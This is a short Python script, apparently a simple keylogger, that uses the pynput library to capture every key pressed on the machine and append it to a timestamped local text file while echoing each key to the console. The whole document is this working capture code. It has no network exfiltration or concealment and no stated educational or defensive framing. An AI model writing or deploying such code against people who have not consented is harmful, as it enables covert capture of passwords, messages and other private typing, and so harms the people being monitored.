from pynput import keyboard
from datetime import datetime

now = datetime.now()
timestamp = now.strftime("%Y%m%d_%H%M%S")

def keyPressed(key):
    print(str(key))
    with open(f"keyfile_{timestamp}.txt", 'a') as logKey:
        try:
            if key == keyboard.Key.enter:
                logKey.write('\n')
            elif key == keyboard.Key.backspace:   
                logKey.write(' backspace ' + ' ') 
            elif key == keyboard.Key.space:   
                logKey.write('\t') 
            else:     
                char = key.char
                logKey.write(char)
        except:
            print("Error getting char")    

if __name__ == "__main__":
    listener = keyboard.Listener(on_press=keyPressed)
    listener.start()
    input()       